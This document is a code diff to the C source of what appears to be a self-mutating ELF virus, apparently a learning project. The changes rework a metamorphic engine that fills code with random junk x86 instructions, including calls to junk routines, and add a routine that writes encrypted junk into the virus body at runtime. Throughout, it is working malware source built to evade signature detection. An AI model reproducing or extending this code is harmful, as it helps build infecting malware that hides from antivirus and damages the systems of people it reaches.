@@ -11,7 +11,7 @@
 extern void __attribute__((naked)) _start(void);
 extern void end(void);
 extern int64_t g_key;
-extern void dummy_start(void);
+extern void real_start(void);
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
@@ -126,6 +126,14 @@ static void patch_jmp(uint8_t *nop, uint8_t *instr_off, uint8_t instr_len, int8_
  * bytes_len: the number of bytes to fill
  */
 
+#define SET_FLAG(var, flag) ((var) |= (flag))
+#define UNSET_FLAG(var, flag) ((var) &= ~(flag))
+#define IS_SET(var, flag) ((var) & (flag))
+#define IS_UNSET(var, flag) (!((var) & (flag)))
+
+#define LEA_FLAG (1 << 0)
+#define CALL_FLAG (1 << 1)
+
 static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
 	uint8_t nop_size = NOPS_LEN;
@@ -137,11 +145,10 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
 	int8_t jmp_index = -1;
 
-	bool lea_flag = false;
+	uint32_t marker = 0;
 
 	while (nop_size > 0) {
 		bytes_len = (ft_nrand() % 4) + 2;
-		//bytes_len = 4;
 
 		if (nop_size < bytes_len) {
 			bytes_len = nop_size;
@@ -149,6 +156,10 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
 		if (bytes_len == 0) {
 			break;
+		}
+
+		if (bytes_len == 5 && IS_SET(marker, CALL_FLAG)) {
+			bytes_len = 4;
 		}
 
 		switch (bytes_len) {
@@ -175,12 +186,12 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 				break;
 
 			case 4:
-				if (!lea_flag) {
+				if (IS_UNSET(marker, LEA_FLAG)) {
 					nop[offset] = 0x48;
 					nop[offset + 1] = 0x8D;
 					nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
 					nop[offset + 3] = ft_nrand();
-					lea_flag = true;
+					SET_FLAG(marker, LEA_FLAG);
 				} else {
 					nop[offset] = 0x48;
 					nop[offset + 1] = 0x83;
@@ -190,13 +201,19 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 				break;
 
 			case 5: 
-				nop[offset] = 0xE8;
-				void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
-				int size = sizeof(tab) / sizeof(tab[0]);
+				if (IS_UNSET(marker, CALL_FLAG)) {
 
-				int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
-				rel_offset = rel_offset - (file_off + 0x7 + offset);
-				ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
+					nop[offset] = 0xE8;
+					//void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
+					void (*tab[])(void) = {junk_pestilence};
+					int size = sizeof(tab) / sizeof(tab[0]);
+
+					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
+					rel_offset = rel_offset - (file_off + 0x7 + offset);
+					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
+
+					SET_FLAG(marker, CALL_FLAG);
+				}
 
 				break;
 
@@ -259,6 +276,23 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 	}
 }
 
+static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, int64_t key) {
+
+	uint16_t dummy_offset	= (uintptr_t)&real_start - (uintptr_t)&_start;
+
+	for (size_t i = 0; i < g_nb_junk; i++) {
+
+		uint8_t rdm_junk[JUNK_LEN];
+
+		gen_junk(rdm_junk, junk_offsets[i]);
+
+		encrypt_offset(rdm_junk, JUNK_LEN, key, junk_offsets[i] - dummy_offset);
+
+		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
+
+	}
+}
+
 static int make_writeable(uint8_t *self, size_t size) {
 	uintptr_t start = (uintptr_t)self;
 	uintptr_t end = start + size; JUNK;
@@ -294,6 +328,7 @@ void mutate(void) {
 	replace_nop((uint8_t *)start, g_junk_offsets); JUNK;
 }
 
+/* this is used only for the first run of the main prog (like fill_offsets) */
 static void write_self_pos(uint8_t *entry) {
 
 	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
@@ -311,14 +346,11 @@ int death(int start_offset, int64_t key, file_t *file) { JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
 	bool is_encrypted = (start_offset != 0x1000) ? true : false;
-	uint16_t dummy_offset	= (uintptr_t)&dummy_start - (uintptr_t)&_start;
 
 	uint8_t *entry = self + start_offset;
 
 	if (is_encrypted) {
-		encrypt(entry + dummy_offset, VIRUS_SIZE - dummy_offset, key);
-		replace_nop(entry, g_junk_offsets);
-		encrypt(entry + dummy_offset, VIRUS_SIZE - dummy_offset, key);
+		replace_nop_encrypt(entry, g_junk_offsets, key);
 	} else {
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
